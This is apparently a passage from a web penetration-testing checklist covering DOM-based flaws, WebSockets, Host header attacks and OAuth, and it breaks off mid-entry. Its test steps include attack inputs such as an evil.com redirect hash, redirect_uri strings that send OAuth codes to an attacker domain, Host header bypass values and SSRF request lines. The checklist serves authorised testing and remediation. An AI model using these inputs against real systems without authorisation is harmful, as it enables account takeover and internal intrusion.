Common sink→vulnerability mapping (vuln.txt §DOM): `location`/`assign` → open redirection · `document.cookie =` → cookie manipulation · `eval`/`setTimeout` → JS injection · `document.domain` → domain manipulation · `WebSocket(url)` → WS-URL poisoning · link/form target → link manipulation · `postMessage` → web message manipulation · `setRequestHeader` → Ajax header manipulation · `FileReader`/file API → local file-path manipulation · `executeSql` → client-side SQLi · `sessionStorage/localStorage` → storage manipulation · XPath evaluation → XPath injection · `JSON.parse` → client-side JSON injection · DOM-data fields → data manipulation · problematic platform APIs → DoS · global symbols via DOM → DOM clobbering.

---

### VUL-DOM-0001 — DOM-based open redirection

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script sets a redirection target (`location`, `.href`, `location.assign`) from attacker-controllable data (e.g. `location.hash`). A crafted URL redirects the victim to a malicious site, used for phishing or as an OAuth/gadget component.

**Test Steps:**

1. Review client JS for redirection sinks fed by a source (e.g. `location.search`/`hash`, `document.referrer`).
2. Craft a URL whose hash is `https://evil.com` and confirm navigation to it when opened.
3. Confirm the redirect follows to the external host.

**Key observations to record:** source→sink path producing a redirect.

**Remediation:**

- Do not dynamically set redirection targets from untrusted data; validate against an allowlist of safe hosts/protocols before redirecting.

---

### VUL-DOM-0002 — DOM-based cookie manipulation

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script writes attacker-controllable data into `document.cookie`. A crafted URL sets an arbitrary cookie value in the victim's browser — used as a building block for larger chains (e.g. poisoning a cookie used later for auth/CSRF decisions).

**Test Steps:**

1. Find `document.cookie = ...` writes driven by a source.
2. Craft a URL and confirm the new cookie value is set on the victim's browser.
3. Assess whether downstream logic uses the poisoned cookie unsafely (chain).

**Key observations to record:** controllable cookie value/name; downstream consumers.

**Remediation:**

- Do not write untrusted data into cookies dynamically; if required, validate strictly and consider server-side enforcement of cookie values.

---

### VUL-DOM-0003 — DOM-based JavaScript injection

**Severity:** High
**Status:** PENDING
**Category:** DOM

**Description:** Script executes attacker-controllable data as JavaScript via `eval`, `Function`, `setTimeout`/`setInterval` strings; or sets `document.domain` from untrusted input, loosening the same-origin boundary. Arbitrary code runs in the victim's browser session.

**Test Steps:**

1. Search for JS-execution sinks fed by sources (`eval(source)`), `innerHTML` direct, `document.write(source)`, `document.domain = ...`.
2. Craft a URL with a payload that executes in the sink (e.g. `javascript:` / expression) and confirm execution (alert/print).

**Key observations to record:** the executable sink; payload that reaches it.

**Remediation:**

- Never execute untrusted data as JavaScript; never set `document.domain` from untrusted input.
- Refactor to safe DOM APIs (`textContent`, `createElement`) and validate inputs.

---

### VUL-DOM-0004 — DOM-based WebSocket-URL poisoning

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script builds a `WebSocket(` URL from attacker-controllable data. The victim's browser opens a WebSocket to an attacker-controlled server — which then sees sensitive data the app sends over the socket, or feeds malicious data back into the app (client-side attacks).

**Test Steps:**

1. Locate `new WebSocket()` calls whose URL is constructed from a source.
2. Craft a URL controlling the WS host/port; confirm the browser connects to your server (see Category M for interception).
3. Assess whether sensitive data is sent to the rogue server.

**Key observations to record:** WS URL constructible to attacker host; data sent on connect.

**Remediation:**

- Do not incorporate untrusted data into WebSocket target URLs; hard-code the endpoint (see Category M).

---

### VUL-DOM-0005 — DOM-based link manipulation

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script writes attacker data to a navigation target (an `<a href>`, form submission URL) within the page. Victims clicking a manipulated link/form are redirected or submit data to an attacker origin.

**Test Steps:**

1. Find `.href`/form-action writes from sources.
2. Craft a URL to change the link/form target to an attacker domain and confirm.

**Key observations to record:** controllable link/form targets.

**Remediation:**

- Do not dynamically set link/form targets from untrusted data; validate with an allowlist of host+scheme.

---

### VUL-DOM-0006 — DOM-based web message manipulation

**Severity:** High
**Status:** PENDING
**Category:** DOM

**Description:** The page receives `postMessage` events without verifying `event.origin`, and passes the message data to a sink (or sends data via messages to a target without specifying it). An attacker frames the page and posts crafted messages that hit the sink → XSS or other execution.

**Test Steps:**

1. Find `addEventListener('message', ...)` handlers; check for missing/weak `event.origin` verification.
2. Find sinks called with the message data (innerHTML, eval, location, WebSocket URL…).
3. PoC: attacker page uses `postMessage` to deliver a payload to the vulnerable listener and confirms execution/impact.
4. Also check `postMessage(targetWindow, ...)` calls that fail to specify/harden the target.

**Key observations to record:** unverified origin listener → reachable sink; target-window hygiene on send.

**Remediation:**

- Verify `event.origin` against an exact allowlist before handling any message data.
- When sending, always explicitly specify the target window; never include untrusted data in messages.

---

### VUL-DOM-0007 — DOM-based Ajax request-header manipulation

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script sets Ajax request headers (`setRequestHeader`) from attacker-controllable data, enabling header-injection or auth/CSRF-relevant header poisoning in client-driven requests.

**Test Steps:**

1. Find `setRequestHeader` calls fed by sources.
2. Craft input that injects a forged header and confirm the request arrives with it (interception/log).

**Key observations to record:** controllable headers; downstream effect.

**Remediation:**

- Do not set request headers from untrusted data dynamically; validate allowed values; prefer server-side header handling.

---

### VUL-DOM-0008 — DOM-based local file-path manipulation

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script passes attacker-controllable data as a filename to a file-handling API (`FileReader`, `<input type=file>` auto-paths, etc.); may read/select unintended local files or trigger unsafe processing.

**Test Steps:**

1. Find file-API sinks fed by sources; confirm the filename/path is attacker-influenced.
2. Determine impact (local file read, path confusion) in the browser context.

**Key observations to record:** controllable filename reaching file API.

**Remediation:**

- Do not pass untrusted data as filenames to file-handling APIs; validate charset/structure or avoid dynamic file handling.

---

### VUL-DOM-0009 — DOM-based client-side SQL injection

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Client-side SQL (Web SQL `executeSql`) built by concatenating attacker data → query injection, reading/modifying local SQLite data the app relies on (persistence stores).

**Test Steps:**

1. Find `executeSql` calls with parameter concatenation from a source.
2. Inject SQL fragments and observe query behavior/returned rows.

**Key observations to record:** injectable client-side query.

**Remediation:**

- Use parameterized queries / prepared statements for all client-side DB access (placeholder `?` + bound parameters); parameterize every variable data item.

---

### VUL-DOM-0010 — DOM-based HTML5-storage manipulation

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script stores attacker-controllable data in `localStorage`/`sessionStorage`. Crafted URLs can plant poisoned values later read by app logic (a persistence/XSS-chain building block).

**Test Steps:**

1. Find `setItem` writes from sources.
2. Craft a URL that stores a malicious value; assess downstream consumers of the storage key.

**Key observations to record:** writable storage keys; downstream use.

**Remediation:**

- Do not place untrusted data into HTML5 storage; validate and sanitize before use downstream.

---

### VUL-DOM-0011 — DOM-based XPath injection

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script incorporates attacker data into an XPath query; injected XPath returns different nodes, leaking data or altering app behavior.

**Test Steps:**

1. Find XPath evaluation fed by a source.
2. Craft input altering the query (boolean/union) and confirm changed results.

**Key observations to record:** injectable XPath query and effect.

**Remediation:**

- Do not incorporate untrusted data into XPath queries; parameterize or validate strictly.

---

### VUL-DOM-0012 — DOM-based client-side JSON injection

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Strings containing untrusted data are parsed as JSON (`JSON.parse`/`eval`-based parsing); malformed/forged JSON changes app state or feeds XSS-capable sinks.

**Test Steps:**

1. Find `JSON.parse` (or custom parsing) on attacker-influenced strings.
2. Inject JSON-breaking characters / values and observe parsing errors or altered data flow.

**Key observations to record:** parsing point reachable with injected JSON.

**Remediation:**

- Do not parse strings containing untrusted data as JSON; validate structure and sanitize before parsing; use safe parsers.

---

### VUL-DOM-0013 — DOM data manipulation

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script dynamically writes untrusted data into DOM-data fields (user-visible values placed via `textContent`/attribute updates) in a way that corrupts app state or leads to injection through downstream parsing. Note: scanners may False-positive this via static analysis — verify the reachable code path.

**Test Steps:**

1. Identify fields written from untrusted sources (URL, messages, storage).
2. Confirm a reachable execution path lets a crafted input alter DOM data in a harmful way; verify no mitigating validation exists.

**Key observations to record:** reachable path, actual exploitability (avoid static-analysis false positives).

**Remediation:**

- Do not write untrusted data into DOM-data fields; validate/sanitize at the write point.

---

### VUL-DOM-0014 — DOM-based denial-of-service

**Severity:** Medium
**Status:** PENDING
**Category:** DOM

**Description:** Script passes attacker data into a problematic platform API (e.g. high-CPU/high-disk operations, storage writes) — a crafted URL can freeze or degrade the user's browser/session (resource exhaustion via client side).

**Test Steps:**

1. Find platform-API sinks (storage writes, workers, recursion loops) reachable from a source.
2. Craft a URL that triggers excessive work (e.g. massive strings) and confirm browser degradation (busy script, storage rejection).

**Key observations to record:** triggering input and observed DoS effect.

**Remediation:**

- Do not pass untrusted data into expensive/problematic platform APIs; enforce size/type limits on such inputs.

---

### VUL-DOM-0015 — DOM clobbering

**Severity:** High
**Status:** PENDING
**Category:** DOM

**Description:** An attacker injects HTML (via an injection point like an attribute or a stored field) that creates DOM elements (`<a id=...>`, `<form>`, `name` attributes) that **overwrite global variables or DOM properties** the application relies on (e.g. a global `window.something` or `Element.attributes`), changing script behavior — for instance, forcing a dynamic script URL to an attacker value.

**Test Steps:**

1. Identify HTML injection points in the page (attribute values, stored HTML that reaches retained DOM).
2. Clobber a global/object used in sensitive logic — e.g. `<a id=x></a>` to override `window.x`; target patterns using a global with `||` (e.g. `const cfg = window.cfg || default`).
3. Confirm the clobbered symbol alters generated URLs or execution paths to a malicious value.

**Key observations to record:** clobberable symbols; subsequent unsafe use (script/logic).

**Remediation:**

- Validate objects/functions before use (e.g. verify `document.getElementById('x').attributes instanceof NamedNodeMap`); reject clobbered DOM nodes in filters.
- Avoid referencing globals with `||` defaults; use a well-tested sanitizer such as DOMPurify that accounts for DOM-clobbering.

---

## DOM-Based — General Remediation Principles (cross-cutting)

- Core rule: never let data from an untrusted source dynamically reach a sink. Where unavoidable, whitelist-validate or apply context-correct encoding (JS/HTML/URL) in the client-side code.
- Per-sink hygiene: avoid dynamic `location`/cookie writes/`document.domain`/WebSocket URLs/link targets/web-message data/Ajax headers/file paths/SQL(XQuery)/storage/JSON parsing/sensitive platform APIs from untrusted data.
- DOM clobbering: verify object identity, avoid global+`||` patterns, use DOM-clobbering-aware sanitizers.

---

# CATEGORY M: WEBSOCKETS

## Background

WebSockets are initiated over HTTP and provide **long-lived, bidirectional** connections. "Virtually any web vulnerability that arises with regular HTTP can also arise with WebSocket communications." Attackers manipulate **messages** (content-level injection) and the **handshake** (session/auth flaws). The most serious WebSocket-specific issue is **cross-site WebSocket hijacking (CSWSH)** — a CSRF attack on the WebSocket handshake.

---

### VUL-WS-0001 — Input-based vulnerabilities via tampered WebSocket messages (XSS/injection)

**Severity:** High
**Status:** PENDING
**Category:** WebSockets

**Description:** WebSocket messages can be intercepted, modified, replayed, and new ones generated. If message content is used unsafely (rendered to other users, embedded in queries), the same classes of client/server injection (XSS, SQLi…) apply as over HTTP. Example: a chat app resends user messages via WebSockets; a `<img onerror>` message executes for other users.

**Test Steps:**

1. Exercise WebSocket functionality through your proxy; identify message formats and who renders/processes them.
2. Intercept a client→server message and tamper with its contents (inject XSS/SQL/noSQL payloads).
3. Confirm server processes the modified message and other users (or back-end DB) consume the malicious value (stored XSS, injection).
4. Replay/generate new messages and observe effects.

**Key observations to record:** message tampering feasibility; vulnerable sink where message data is consumed.

**Remediation:**

- Treat WS data as untrusted in **both** directions; encode/validate before rendering to users or embedding in queries (prevent stored XSS/SQLi).

---

### VUL-WS-0002 — Blind vulnerabilities via WebSockets (OAST detection)

**Severity:** Medium
**Status:** PENDING
**Category:** WebSockets

**Description:** Some vulnerabilities reachable via WebSocket messages are **blind** — no response reflects evidence. Detection requires out-of-band (OAST) techniques (e.g. Burp Collaborator) to observe effects on back-end systems.

**Test Steps:**

1. Identify WS messages flowing into back-end processing (search, loaders, imports).
2. Inject OAST-deliverable payloads (e.g. Collaborator domain in URLs, XXE/DNS payloads) via tampered messages.
3. Monitor for inbound interactions (DNS/HTTP) from the target to confirm the blind effect.

**Key observations to record:** out-of-band interactions triggered via WS messages.

**Remediation:**

- Apply the same back-end hardening as HTTP (validate/encode WS inputs, patch internal services, control outbound requests).

---

### VUL-WS-0003 — WebSocket handshake manipulation → session/auth bypass

**Severity:** High
**Status:** PENDING
**Category:** WebSockets

**Description:** Flaws in the handshake handling let an attacker manipulate the session context: the WebSocket session is derived from the handshake request, so tampering with handshake headers/cookies can attach the connection to a different session context (design flaws in session handling), or bypass handshake-only validation.

**Test Steps:**

1. Capture a full WebSocket handshake request.
2. Manipulate the handshake (headers, cookies, URL) and reconnect (clone/reconnect with edited handshake) via Repeater.
3. Observe whether the resulting WS session belongs to an unintended context (e.g. processed with another user's session), and whether handshake-based access controls are bypassed.

**Key observations to record:** handshake-level session binding flaw; unauthorized operations feasible on the socket.

**Remediation:**

- Bind the WebSocket session strictly to the authenticated HTTP session of the handshake; re-validate auth on every state change; treat handshake-only trust as insufficient.

---

### VUL-WS-0004 — Cross-site WebSocket hijacking (CSWSH)

**Severity:** High
**Status:** PENDING
**Category:** WebSockets

**Description:** The handshake depends on a regular HTTP request that carries the session cookie; if it lacks CSRF protection, an attacker page can open a WebSocket to the target from the victim's browser, and the target lets the connection proceed based on cookies alone. The attacker then performs privileged actions or reads sensitive data received over the socket.

**Test Steps:**

1. Examine the handshake: it should be authenticated purely by cookie/header (no per-request token).
2. From an attacker-controlled page (cross-site), open `new WebSocket('wss://target/chat')` — if the connection succeeds (HTTP 101) using the victim's cookies, CSWSH is present.
3. Observe server messages/data available on that socket and the actions the socket allows.

**Key observations to record:** cross-site handshake success with victim cookies; data/actions exposed.

**Remediation:**

- Protect the WebSocket handshake against CSRF (use a handshake nonce/token tied to the session, same-origin checks).
- Use `wss://` always; hard-code the endpoint URL (no user-controllable data in it); treat received data as untrusted.

---

## WebSockets — General Remediation Principles (cross-cutting)

- Use `wss://` (WebSockets over TLS) exclusively.
- Hard-code the WebSocket endpoint URL; never incorporate user-controllable data into it.
- Protect the handshake against CSRF (prevents CSWSH).
- Treat data received via WebSocket as untrusted in both directions; handle it safely on both server and client (prevents SQLi/XSS).

---

# CATEGORY N: HTTP HOST HEADER ATTACKS

## Background

The **HTTP Host header** identifies the intended back-end for a request (virtual hosting, reverse proxies/CDNs). If the server implicitly trusts it (fails to validate/escape), the attacker can inject payloads ("Host header injection") leading to: web cache poisoning, business-logic flaws (e.g. password reset poisoning), routing-based SSRF, access-control bypass, classic server-side vulnerabilities (SQLi), connection-state attacks, and virtual-host brute-forcing.

**How attacks arise:** flawed assumption the header isn't user-controllable; and misconfigured infrastructure (front-ends/back-ends disagreeing, or supporting Host-override headers like `X-Forwarded-Host` by default).

---

### VUL-HOST-0001 — Host header injection & validation bypass (arbitrary host, override headers)

**Severity:** High
**Status:** PENDING
**Category:** Host Header

**Description:** The application uses the `Host` header value (or a supported override header) to build absolute URLs, redirects, or server-side routing without validating it against a whitelist — attacker-controlled host name reflected into responses and functionality. Includes flawed-validation bypasses (non-numeric ports, suffix-matching subdomains, duplicate Host headers, absolute URLs, line wrapping) and override headers (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`).

**Test Steps:**

1. Supply an arbitrary, unrecognized `Host` and confirm you still reach the app (no "Invalid Host" error); observe whether the value is reflected (links, redirects, canonical URLs).
2. Test flawed validation: `Host: vulnerable-site.com:bad-stuff-here` (non-numeric port), `Host: notvulnerable-site.com` (suffix matching), an already-compromised subdomain (`hacked-subdomain.vulnerable-site.com`).
3. Test ambiguous requests: duplicate `Host` headers (front-end vs back-end precedence), absolute URL in request line (`GET <https://vulnerable-site.com/> HTTP/1.1` + poisoned `Host`), indented/line-wrapped headers (space-prefixed Host).
4. Test Host-override headers: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`.
5. Also probe the Host value into classic server-side injection (e.g. SQL-probing characters in the Host value).

**Key observations to record:** whether arbitrary/overridden hosts are accepted; where the host value is used server-side; reflected contexts.

**Remediation:**

- Validate the Host header against a whitelist of permitted domains; reject/redirect unrecognized hosts (e.g. framework `ALLOWED_HOSTS`).
- Do not trust/support Host-override headers (`X-Forwarded-Host` etc.) unless required, and validate them identically.
- Build absolute URLs from server configuration, not the Host header; prefer relative URLs.

---

### VUL-HOST-0002 — Password reset poisoning via Host header

**Severity:** High
**Status:** PENDING
**Category:** Host Header

**Description:** The password-reset email link is generated from the request-supplied `Host` (or `X-Forwarded-Host`). The attacker poisons the host so the reset token link is delivered to a domain they control, then uses the token to reset the victim's password. (See also VUL-AUTH-0013.)

**Test Steps:**

1. Trigger a password reset and intercept the request to the reset mechanism.
2. Set `Host` (or `X-Forwarded-Host` etc.) to an attacker-controlled host and send.
3. Check the generated reset link in the email/response: if it points to the attacker host, the token is stealable → victim account takeover.

**Key observations to record:** host value used to build the reset link; token delivery domain.

**Remediation:**

- Require the current domain from a configuration file; never derive it from the Host header for reset links.
- Reject unrecognized hosts; drop `X-Forwarded-Host` support; validate on submission as well.

---

### VUL-HOST-0003 — Web cache poisoning via Host header

**Severity:** High
**Status:** PENDING
**Category:** Host Header

**Description:** The Host header (or override header) is reflected unencoded in a cached page's markup or in a key URL (e.g. an `img src` or script URL). A poisoned response is stored in the integrated/application cache and served to all users (stored client-side payload such as XSS via the cached page).

**Test Steps:**

1. Send requests with a poisoned `Host`/`X-Forwarded-Host` and observe unescaped reflection in the response body (markup, or used in script `src`).
2. If the response is cacheable (application-level caches often exclude Host from the cache key), get it cached and verify it is served to a fresh visitor.
3. Construct a payload that executes for users (e.g. injected `img`/`script` URL) and confirm the cached response serves it.

**Key observations to record:** reflection point usable as a script/resource URL; cacheability of the poisoned response.

**Remediation:**

- Use relative URLs where possible; validate the Host header; never reflect unencoded host values.
- Cache only responses with verified safe content (see Category G remediation for caching hygiene).

---

### VUL-HOST-0004 — Access control / authentication bypass via Host header

**Severity:** High
**Status:** PENDING
**Category:** Host Header

**Description:** Access-control logic assumes a resource is "internal" based on the Host header (or a host-derived check). By changing the `Host`, an attacker bypasses the restriction and reaches admin/internal functionality — increasing the attack surface (often combined with other exploits on the exposed functions).

**Test Steps:**

1. Identify functionality restricted to internal/host-based sources.
2. Send the restricted request with a modified `Host` value (e.g. `localhost`, an internal hostname, or the whitelisted-but-unexpected host).
3. Confirm the restricted page/functionality becomes reachable without further credentials.

**Key observations to record:** host value that bypasses the check; exposed functionality.

**Remediation:**

- Never base authorization on the Host header or source IP; enforce by authenticated identity/session.
- Restrict access server-side with explicit authorization checks.

---

### VUL-HOST-0005 — Virtual host brute-forcing (hidden internal hosts)

**Severity:** Medium
**Status:** PENDING
**Category:** Host Header

**Description:** Public and internal sites share a server using virtual hosting. Internal hostnames may lack public DNS (or resolve to private IPs), so they're invisible to normal users — but the server responds to any `Host` matching a configured virtual host. Brute-forcing candidate subdomains reveals hidden/internal applications.

**Test Steps:**

1. Build a wordlist of candidate subdomains/hostnames (information-disclosure hints, company subdomains, common internal names like `intranet`, `admin`, `dev`).
2. Send requests with `Host: <candidate>` (keeping the target as the connection IP via Repeater).
3. Differentiate valid virtual hosts by response differences (content, status, redirects, custom headers).

**Key observations to record:** discovered internal hostnames; content/status signatures.

**Remediation:**

- Do not host internal-only websites/applications on the same server as public content.
- If co-hosting is unavoidable, firewall virtual hosts to trusted sources and require auth.

---

### VUL-HOST-0006 — Routing-based SSRF via Host header

**Severity:** High
**Status:** PENDING
**Category:** Host Header

**Description:** Intermediary systems (load balancers/reverse proxies) forward requests to back-ends based on an unvalidated `Host` header. Manipulating the Host routes requests to arbitrary systems — including internal, private-IP hosts the attacker cannot reach directly (e.g. bypassing ACLs/blocks on hostname or IP).

**Test Steps:**

1. Supply your Collaborator domain as the `Host`; a DNS lookup from the target/in-path system confirms routing to arbitrary domains is possible.
2. Enumerate internal destinations: probe private ranges (`192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`) and internal hostnames reached via Host-based routing.
3. Access internal admin/management interfaces through the misrouted request.

**Key observations to record:** Host values that trigger routing to Collaborator/internal IPs; internal resources reachable.

**Remediation:**

- Configure load balancers/reverse proxies to forward only to a whitelist of permitted domains.
- Validate the Host header at the entry point; apply egress filtering.

---

### VUL-HOST-0007 — Connection state attacks (Host validation bypass via keep-alive reuse)

**Severity:** High
**Status:** PENDING
**Category:** Host Header

**Description:** Some HTTP servers validate only the **first** request on a reused (keep-alive) HTTP/1.1 connection, assuming later requests share the same Host. Sending an innocent first request, then a malicious Host on the same connection bypasses validation — enabling cache poisoning, password-reset poisoning, and routing SSRF even on "validated" hosts.

**Test Steps:**

1. Verify the server reuses connections for multiple requests in a single connection (HTTP/1.1 keep-alive).
2. Send a clean, validated first request, then immediately a second request with a poisoned `Host` on the same connection.
3. Observe whether the malicious request is accepted/processed (e.g. reflected host, routed to Collaborator).

**Key observations to record:** per-connection validation-only behavior; successful second-request injection.

**Remediation:**

- Validate the Host header on **every** request, not just the first on a connection.
- Treat connection reuse as untrusted; disallow mid-connection host changes.

---

### VUL-HOST-0008 — SSRF via malformed request line (reverse proxy misrouting)

**Severity:** High
**Status:** PENDING
**Category:** Host Header

**Description:** Custom proxies fail to validate the request line. A path like `GET @private-intranet/example HTTP/1.1` is prefixed with the upstream (`http://backend-server@private-intranet/example`), which HTTP libraries interpret as connecting to `private-intranet` with username `backend-server` — a request to an arbitrary internal host.

**Test Steps:**

1. Identify reverse-proxy behavior that prefixes/rewrites the request path to an upstream URL.
2. Submit a path beginning with `@` or URL-userinfo syntax (`GET @private-intranet/example HTTP/1.1`) and observe where the request is routed (Collaborator/private IP).
3. Confirm internal endpoints are reachable through the proxy.

**Key observations to record:** request line that misroutes; internal target reachability.

**Remediation:**

- Strictly validate the request line/path (reject `@`, userinfo, and unexpected characters) at the proxy.
- Validate resolved upstream destinations against an allowlist; apply egress filtering.

---

## HTTP Host Header — General Remediation Principles (cross-cutting)

- Avoid using the Host header in server-side code; prefer relative URLs (side-steps cache-poisoning/routing issues).
- For absolute URLs, take the domain from a configuration file, never the Host header.
- Validate the Host header against a whitelist of permitted domains (reject others); consult framework docs (e.g. Django `ALLOWED_HOSTS`).
- Do not support Host-override headers (`X-Forwarded-Host`, etc.) unless needed, and validate them the same way.
- Configure load balancers/proxies to forward only to whitelisted domains.
- Avoid hosting internal-only virtual hosts on public servers.

---

# CATEGORY O: OAUTH AUTHENTICATION

## Background

OAuth 2.0 is a common, loosely-defined authorization framework; using it for **authentication** (SSO-style login) adds complexity and attack surface. Vulnerabilities arise in the client application AND in OAuth service configuration. Both the `authorization code` and `implicit` grant types send sensitive data via the browser. Security relies on correct optional configuration (`state`, `redirect_uri`, `scope`, `client_secret`/PKCE, `id_token` validation) and robust custom validation.

**Identify OAuth:** "Log in with <provider>" option; authorization request to `/authorization` with `client_id`, `redirect_uri`, `response_type`, `scope`, `state`. Recon via `/.well-known/oauth-authorization-server` and `/.well-known/openid-configuration`.

---

### VUL-OAUTH-0001 — OAuth authentication bypass via implicit grant

**Severity:** Critical
**Status:** PENDING
**Category:** OAuth

**Description:** In a flawed implicit-flow implementation, the client application receives an access token via the browser and then submits user data + token in a POST to log the user in — without verifying the token matches the submitted identity. An attacker changes the submitted parameters to impersonate any user.

**Test Steps:**

1. Complete the OAuth login flow while proxying traffic; identify the POST that logs the user in (contains user ID/token).
2. Modify the user-identifying parameters (e.g. `username`, `email`, user ID) to a victim value while keeping the session/request otherwise valid.
3. If you are then logged in as the victim, the token↔identity binding is missing/weak.

**Key observations to record:** login POST parameters; whether identity and token are cross-validated.

**Remediation:**

- During the implicit flow, server-side, exchange/verify the access token (call `/userinfo` or the token introspection endpoint) and derive identity from the verified response — never trust client-supplied identity.
- Prefer the authorization-code grant + PKCE for server-side apps.

---

### VUL-OAUTH-0002 — Flawed OAuth CSRF protection (missing/weak `state`)

**Severity:** High
**Status:** PENDING
**Category:** OAuth

**Description:** The authorization request omits the `state` parameter (or uses a weak/predictable one). An attacker initiates an OAuth flow, then tricks the victim's browser into completing it — e.g. forcing account/profile linking (binding the victim's account to the attacker's social profile), or login-CSRF (victim logged into attacker's account).

**Test Steps:**

1. Inspect the authorization request: is a `state` parameter sent with a high-entropy, session-unique value?
2. If absent: PoC that the victim's browser can complete an attacker-initiated OAuth flow (e.g. social-profile linking or login to the attacker's account).
3. If present but weak: test whether the value is predictable/reusable across sessions.

**Key observations to record:** presence/entropy of `state`; CSRF-style OAuth completion in a victim browser.

**Remediation:**

- Always use the `state` parameter with an unguessable, session-bound value (e.g. hash of the session cookie); validate it strictly on the callback.
- Providers: enforce state; clients: always send and validate it.

---

### VUL-OAUTH-0003 — OAuth account hijacking via flawed `redirect_uri` validation

**Severity:** Critical
**Status:** PENDING
**Category:** OAuth

**Description:** The OAuth service fails to validate `redirect_uri` properly, so an attacker causes the victim's authorization code (or token) to be delivered to an attacker-controlled URI. With a stolen code, the attacker completes the code/token exchange (even without the client secret) and logs into the victim's account.

**Test Steps:**

1. Probe `redirect_uri` validation: append paths/query/fragments, use `@`/userinfo tricks (`https://default-host.com&@foo.evil-user.net#@bar.evil-user.net/`), duplicate `redirect_uri` params, `localhost`like domains, response_mode switches (query↔fragment), web_message subdomains.
2. Test directory traversal in the default URI (`/oauth/callback/../../example/path`) to reach other pages on the domain.
3. Craft the authorization URL with the attacker `redirect_uri`; have the victim (with an active OAuth session) open it so the browser sends the code/token to the attacker's endpoint; use it to log in as the victim (code flow: forward code to the legitimate `/callback`).

**Key observations to record:** accepted `redirect_uri` variants; code/token leakage to attacker URL; successful account login with stolen code.

**Remediation:**

- Providers: require client registration of a whitelist of `redirect_uris`; validate with strict byte-for-byte comparison (no prefix/suffix/regex).
- Clients: always send `redirect_uri` to both `/authorization` and `/token`; the provider must match the two.
- Never allow `localhost`only checks in production; validate `response_mode` combinations.

---

### VUL-OAUTH-0004 — Stealing OAuth codes/tokens via proxy page / open redirect

**Severity:** High
**Status:** PENDING
**Category:** OAuth

**Description:** Even with correct external-domain blocking, an attacker points `redirect_uri` at another **whitelisted-domain page** that leaks the query string (code flow) or fragment (implicit flow) — typically via an open redirect, insecure web-messaging scripts, XSS, or HTML injection (Referer leak via `<img>`).

**Test Steps:**

1. Map which paths on the whitelisted domain can be set as `redirect_uri` (incl. traversal).
2. For the code flow, look for a page that forwards query parameters (open redirect; `img src=attacker` Referer leak).
3. For the implicit flow, find a script that reads the URL fragment and forwards it (web message, open redirect with fragment).
4. Chain: victim → authorization → `redirect_uri` proxy page → attacker domain with the code/token; use the stolen code/token to take over the account.

**Key observations to record:** proxy page that forwards code/token; end-to-end leakage.

**Remediation:**

- Providers: byte-for-byte `redirect_uri` whitelist (prevents off-path redirects).
- Clients: avoid storing/echoing codes in custom scripts; use robust token binding + state; prevent open redirects; validate sender windows in messaging scripts.

---

### VUL-OAUTH-0005 — Broken OAuth scope validation (scope upgrade)

**Severity:** High
**Status:** PENDING
**Category:** OAuth

**Description:** The OAuth service does not validate the `scope` in the token request/token usage against the scope originally approved by the user. A stolen token (or a malicious client application) can be "upgraded" with extra permissions (e.g. adding `profile` scope) to access additional sensitive user data without consent.

**Test Steps:**

1. Authorization-code flow: register/control a client app; after approval for a limited scope, add an extra `scope` to the `/token` exchange request and see whether the returned access token grants it.
2. Implicit flow: steal (or obtain) an access token, then call `/userinfo` with an added scope value; check whether the extra data is returned without new consent.

**Key observations to record:** whether added scopes are honored without re-consent; data surfaced.

**Remediation:**

- Resource server: verify the token was issued to the same `client_id` making the request, and that the requested scope matches the scope originally granted for the token.

---

### VUL-OAUTH-0006 — Unverified user registration (fraudulent OAuth account)

**Severity:** High
**Status:** PENDING
**Category:** OAuth

**Description:** Client applications assume the OAuth provider's stored identity data is verified/correct. If the provider allows account registration without verifying details (e.g. email), an attacker registers an account with the victim's email at the provider and logs into the client as the victim — full impersonation.

**Test Steps:**

1. Determine which claims the client uses for identity (email, username) and whether the provider verifies them at registration.
2. Register a provider account using the victim's known email (unverified).
3. Use "Log in with provider" on the client with the fraudulent account — if you are admitted as the victim, the client has no independent identity verification.

**Key observations to record:** identity claims used; ability to register unverified duplicates.

**Remediation:**

- Clients: verify identity with provider-issued, verified data (email_verified, id_token claims) and never equate an unverified claim with account identity.
- Providers: enforce verification of email/phone at registration.

---

### VUL-OAUTH-0007 — Unprotected dynamic client registration (second-order SSRF)

**Severity:** High
**Status:** PENDING
**Category:** OAuth

**Description:** If dynamic client registration (`/openid/register`) is allowed without authentication, an attacker registers a malicious client app. Attacker-controllable registration properties that are URIs (`logo_uri`, `jwks_uri`, `initiate_login_uri`, etc.) may be fetched by the OpenID provider → **second-order SSRF** into internal services; other properties can point tokens/keys at attacker infrastructure.

**Test Steps:**

1. Check the provider config/docs for a `/registration` endpoint and whether authentication is required.
2. Register a client pointing attacker-controllable URI properties (e.g. `jwks_uri`/`logo_uri`) at a Collaborator host; trigger any provider fetch (e.g. during token verification/logo load).
3. Confirm SSRF (inbound DNS/HTTP from the provider) and assess internal reachability.

**Key observations to record:** unauthenticated registration; provider fetches of attacker URIs.

**Remediation:**

- Require authentication/approval for client registration; or fully disable dynamic registration.
- Sanitize/allowlist registration URI fields server-side (prevent second-order SSRF) and validate fetched URLs (SSRF controls).

---

### VUL-OAUTH-0008 — Authorization requests by reference (`request_uri` SSRF / validation bypass)

**Severity:** High
**Status:** PENDING
**Category:** OAuth

**Description:** Providers supporting `request_uri` (OAuth parameters passed by reference in a JWT) may (a) fetch the `request_uri` server-side → SSRF, and (b) fail to apply the same validation to JWT-carried parameters — bypassing `redirect_uri`/scope checks applied to query strings.

**Test Steps:**

1. Check for `request_uri_parameter_supported` in the config/docs; or try adding a `request_uri` parameter.
